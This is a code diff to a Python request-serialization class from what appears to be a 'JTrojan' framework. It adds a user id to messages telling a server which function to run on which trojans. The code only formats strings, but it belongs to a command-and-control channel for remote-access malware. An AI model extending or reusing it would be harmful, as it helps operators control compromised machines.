@@ -3,15 +3,29 @@ import pickle
 
 
 class RequestForm:
+    """
+    This class represents the string, that is being sent from the user of the JTrojan system to the server. The request
+    transmission is according to a form, that begins with the request header and which specifies the following
+    information:
+    - id: The id of the user, that sends the request, so that the server can address the response to the correct socket
+    - function name: The name of the function to be executed within the server
+    - return mode: whether or not the server is supposed to return the resulting data immediatly or store it in the
+        buffer if the users profile. So whether the user is executing as blocking or non blocking command
+    - error mode: -
+    - addresses: A list with the entities, that are being addresses by the function, so on which trojans the function
+        is supposed to be executed on
+    - parameters: The parameters of the function call. Originally given as a list and then pickled and string encoded
+    """
 
     header = "REQUEST"
 
-    def __init__(self, function_name, parameters, addresses, return_mode, error_mode):
+    def __init__(self, function_name, parameters, addresses, return_mode, error_mode, id):
         self.function_name = function_name
         self.parameters = parameters
         self.addresses = addresses
         self.return_mode = return_mode
         self.error_mode = error_mode
+        self.id = id
 
         # The length of the parameters byte object as it is being received
         self._length = None
@@ -25,6 +39,9 @@ class RequestForm:
         The string of the form string
         """
         string_list = [self.header]
+        # Adding the id of the user
+        id_string = self.create_id_string()
+        string_list.append(id_string)
         # Adding function name line
         function_name_string = self.create_function_name_string()
         string_list.append(function_name_string)
@@ -57,6 +74,16 @@ class RequestForm:
         assert self._length is not None
         # The string list, that will be the string
         string_list = ["length:", str(self._length)]
+        return ''.join(string_list)
+
+    def create_id_string(self):
+        """
+        This method creates the string line, that tells the server which user has sent the request, so that it can send
+        the return of the request to the correct user
+        Returns:
+        The string line
+        """
+        string_list = ["id:", str(self.id)]
         return ''.join(string_list)
 
     def create_function_name_string(self):
@@ -140,7 +167,7 @@ class RequestForm:
 
 
 if __name__ == '__main__':
-    f = RequestForm("get", ["hallo", True], ["max", "anna"], "blocking", "discard")
+    f = RequestForm("get", ["hallo", True], ["max", "anna"], "blocking", "discard", "Jonas")
     print(f.create_form_string())
 
 
